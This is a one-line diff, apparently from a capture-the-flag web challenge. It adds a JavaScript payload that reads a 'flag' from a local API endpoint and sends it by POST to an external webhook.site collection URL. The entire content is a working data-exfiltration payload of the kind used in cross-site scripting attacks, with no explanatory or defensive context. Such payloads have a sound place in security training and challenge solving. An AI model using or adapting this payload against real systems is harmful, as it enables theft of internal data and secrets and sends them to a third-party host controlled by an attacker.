@@ -1,0 +1,1 @@
+fetch("http://localhost:5000/api/fetchflag").then(response => response.text()).then(data => {fetch("https://webhook.site/4fb6e451-a032-4c36-be3c-1a88e3c1bcc5", { method: "POST", header: {"Content-Type": "application/json"}, body: JSON.stringify({flag: data}) });  });
